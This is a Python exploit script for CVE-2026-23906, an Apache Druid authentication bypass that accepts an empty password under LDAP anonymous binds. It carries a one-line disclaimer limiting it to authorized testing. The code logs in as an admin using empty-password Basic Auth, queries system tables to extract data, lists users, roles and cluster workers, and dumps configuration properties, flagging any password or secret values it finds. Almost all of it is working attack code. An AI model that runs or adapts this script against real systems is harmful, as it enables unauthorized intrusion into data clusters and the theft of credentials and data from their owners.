#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Druid Post-Auth Data Exfiltration & Admin Actions
# CVE            : CVE-2026-23906
# Vendor         : Apache Software Foundation
# Product        : Apache Druid
# Affected       : 0.17.0 through 35.x (prior to 36.0.0)
# Type           : CWE-287 - Improper Authentication
# CVSS           : 9.8 (Critical)
# Platform       : Multiple
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Post-Auth Data Exfiltration & Admin Actions (Vector 3)

Demonstrates the full impact chain after CVE-2026-23906 authentication bypass:
Auth Bypass → Data Access → Admin Control

ATTACK CHAIN:
  1. Authenticate with empty password (CVE-2026-23906 bypass)
  2. Execute SQL queries to exfiltrate data from system tables
  3. Enumerate users, roles, and cluster workers via admin APIs
  4. Retrieve configuration properties including security-relevant settings

PREREQUISITES:
  - Apache Druid 0.17.0 - 35.x with LDAP authentication enabled
  - LDAP server that permits anonymous binds

REFERENCES:
  - CVE-2026-23906
  - /druid/v2/sql, /druid-ext/basic-security/*, /druid/indexer/v1/workers
"""

import sys
import json
import base64
import http.client


RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8888
DEFAULT_USERNAME = "admin"


def make_request(host, port, path, method="GET", username="admin", password="",
                 body=None, content_type=None, timeout=15):
    """Send HTTP request with empty-password Basic Auth (the exploit)."""
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
    headers = {"Authorization": f"Basic {credentials}"}
    if content_type:
        headers["Content-Type"] = content_type

    try:
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        resp_body = resp.read().decode("utf-8", errors="replace")
        status = resp.status
        conn.close()
        return status, resp_body
    except Exception as e:
        conn.close()
        return 0, str(e)


def sql_query(host, port, username, query):
    """Execute a SQL query via the Druid SQL endpoint using the auth bypass."""
    body = json.dumps({"query": query})
    return make_request(host, port, "/druid/v2/sql", method="POST",
                        username=username, body=body,
                        content_type="application/json")


def print_section(title):
    """Print a section header."""
    print(f"\n{BOLD}{CYAN}{'─'*60}")
    print(f"  {title}")
    print(f"{'─'*60}{RESET}")


def exfil_system_tables(host, port, username):
    """Exfiltrate data from Druid system tables via SQL."""
    print_section("DATA EXFILTRATION: System Tables")

    queries = [
        ("INFORMATION_SCHEMA.SCHEMATA", "SELECT * FROM INFORMATION_SCHEMA.SCHEMATA"),
        ("INFORMATION_SCHEMA.TABLES", "SELECT TABLE_SCHEMA, TABLE_NAME, TABLE_TYPE FROM INFORMATION_SCHEMA.TABLES"),
        ("sys.servers", 'SELECT "server", "server_type", "host", "plaintext_port", "curr_size", "max_size" FROM sys.servers'),
        ("sys.segments (count)", "SELECT COUNT(*) AS segment_count FROM sys.segments"),
        ("sys.tasks (recent)", 'SELECT "task_id", "type", "status", "created_time" FROM sys.tasks ORDER BY "created_time" DESC LIMIT 5'),
    ]

    results = {}
    for label, query in queries:
        status, body = sql_query(host, port, username, query)
        if status == 200:
            try:
                data = json.loads(body)
                results[label] = data
                row_count = len(data) if isinstance(data, list) else "?"
                print(f"  {GREEN}✓{RESET} {label}: {row_count} rows returned")
                # Print first few rows
                if isinstance(data, list):
                    for row in data[:3]:
                        print(f"    {CYAN}{json.dumps(row, default=str)}{RESET}")
                    if len(data) > 3:
                        print(f"    {CYAN}... and {len(data) - 3} more rows{RESET}")
            except json.JSONDecodeError:
                print(f"  {YELLOW}⚠{RESET} {label}: Got HTTP 200 but couldn't parse JSON")
        else:
            print(f"  {RED}✗{RESET} {label}: HTTP {status}")

    return results


def enumerate_druid_users(host, port, username):
    """List Druid basic-security users via the admin API."""
    print_section("ADMIN RECON: Druid User Enumeration")

    # List users in the LDAP authenticator
    status, body = make_request(host, port,
                                "/druid-ext/basic-security/authentication/db/ldap/users",
                                username=username)
    if status == 200:
        try:
            users = json.loads(body)
            print(f"  {GREEN}✓{RESET} Found {len(users)} user(s) in LDAP authenticator:")
            for u in users:
                print(f"    {CYAN}• {u}{RESET}")
            return users
        except json.JSONDecodeError:
            print(f"  {GREEN}✓{RESET} Got response: {body[:200]}")
    else:
        print(f"  {YELLOW}⚠{RESET} User listing returned HTTP {status}")
        if status == 403:
            print(f"    {YELLOW}(User may lack admin privileges for this endpoint){RESET}")

    return []


def enumerate_druid_roles(host, port, username):
    """List Druid authorization roles via the admin API."""
    print_section("ADMIN RECON: Druid Role Enumeration")

    status, body = make_request(host, port,
                                "/druid-ext/basic-security/authorization/db/ldapauth/roles",
                                username=username)
    if status == 200:
        try:
            roles = json.loads(body)
            print(f"  {GREEN}✓{RESET} Found {len(roles)} role(s) in LDAP authorizer:")
            for r in roles:
                print(f"    {CYAN}• {r}{RESET}")
            return roles
        except json.JSONDecodeError:
            print(f"  {GREEN}✓{RESET} Got response: {body[:200]}")
    else:
        print(f"  {YELLOW}⚠{RESET} Role listing returned HTTP {status}")

    return []


def get_cluster_workers(host, port, username):
    """Get cluster worker information."""
    print_section("ADMIN RECON: Cluster Workers")

    status, body = make_request(host, port,
                                "/druid/indexer/v1/workers",
                                username=username)
    if status == 200:
        try:
            workers = json.loads(body)
            print(f"  {GREEN}✓{RESET} Cluster workers:")
            if isinstance(workers, list):
                for w in workers:
                    worker_info = w.get("worker", w)
                    whost = worker_info.get("host", "?") if isinstance(worker_info, dict) else str(worker_info)
                    print(f"    {CYAN}• {whost}{RESET}")
            else:
                print(f"    {CYAN}{json.dumps(workers, indent=2, default=str)[:500]}{RESET}")
            return workers
        except json.JSONDecodeError:
            print(f"  {GREEN}✓{RESET} Got response: {body[:200]}")
    else:
        print(f"  {YELLOW}⚠{RESET} Workers endpoint returned HTTP {status}")

    return []


def get_druid_config(host, port, username):
    """Retrieve Druid cluster configuration properties."""
    print_section("ADMIN RECON: Configuration Properties")

    endpoints = [
        ("/status/properties", "Runtime Properties"),
        ("/status/selfDiscovered/status", "Self-Discovered Status"),
    ]

    for endpoint, label in endpoints:
        status, body = make_request(host, port, endpoint, username=username)
        if status == 200:
            try:
                data = json.loads(body)
                # Show a subset of interesting properties
                if isinstance(data, dict):
                    interesting_keys = [k for k in data.keys()
                                        if any(term in k.lower() for term in
                                               ["password", "secret", "ldap", "auth", "security", "host", "port"])]
                    print(f"  {GREEN}✓{RESET} {label}: {len(data)} properties")
                    if interesting_keys:
                        print(f"    {YELLOW}Security-relevant properties:{RESET}")
                        for k in interesting_keys[:10]:
                            v = str(data[k])
                            # Highlight password-like values
                            if "password" in k.lower() or "secret" in k.lower():
                                print(f"    {RED}⚠ {k} = {v}{RESET}")
                            else:
                                print(f"    {CYAN}  {k} = {v}{RESET}")
                else:
                    print(f"  {GREEN}✓{RESET} {label}: Got response")
            except json.JSONDecodeError:
                print(f"  {GREEN}✓{RESET} {label}: Non-JSON response ({len(body)} bytes)")
        else:
            print(f"  {YELLOW}⚠{RESET} {label}: HTTP {status}")


def run_post_exploitation(host, port, username):
    """Run the full post-exploitation demonstration."""
    print(f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════════════╗
║  CVE-2026-23906 — Vector 3: Post-Auth Data Exfiltration        ║
╚══════════════════════════════════════════════════════════════════╝{RESET}

{CYAN}Attack:{RESET}  Post-exploitation after auth bypass — data access & admin control
{CYAN}Target:{RESET}  {host}:{port}
{CYAN}User:{RESET}    {username} (impersonated via empty password)
""")

    # First confirm the bypass still works
    print(f"{BOLD}[Pre-check]{RESET} Confirming auth bypass...")
    status, _ = make_request(host, port, "/status", username=username)
    if status != 200:
        print(f"  {RED}✗{RESET} Auth bypass failed (HTTP {status}). Cannot proceed.")
        return False
    print(f"  {GREEN}✓{RESET} Authenticated as '{username}' with empty password\n")

    # Run all post-exploitation steps
    tables = exfil_system_tables(host, port, username)
    users = enumerate_druid_users(host, port, username)
    roles = enumerate_druid_roles(host, port, username)
    workers = get_cluster_workers(host, port, username)
    get_druid_config(host, port, username)

    # Summary
    print(f"\n{'='*60}")
    print(f"{BOLD}POST-EXPLOITATION SUMMARY{RESET}")
    print(f"{'='*60}")
    print(f"  {GREEN}✓{RESET} Data exfiltration:  {len(tables)} system tables queried")
    print(f"  {GREEN}✓{RESET} User enumeration:   {len(users)} Druid users found")
    print(f"  {GREEN}✓{RESET} Role enumeration:   {len(roles)} Druid roles found")

    print(f"\n{GREEN}{BOLD}[+] Full post-exploitation demonstrated!{RESET}")
    print(f"{GREEN}    Attacker has complete admin access to the Druid cluster.{RESET}")
    return True


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    username = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_USERNAME

    success = run_post_exploitation(host, port, username)
    sys.exit(0 if success else 1)
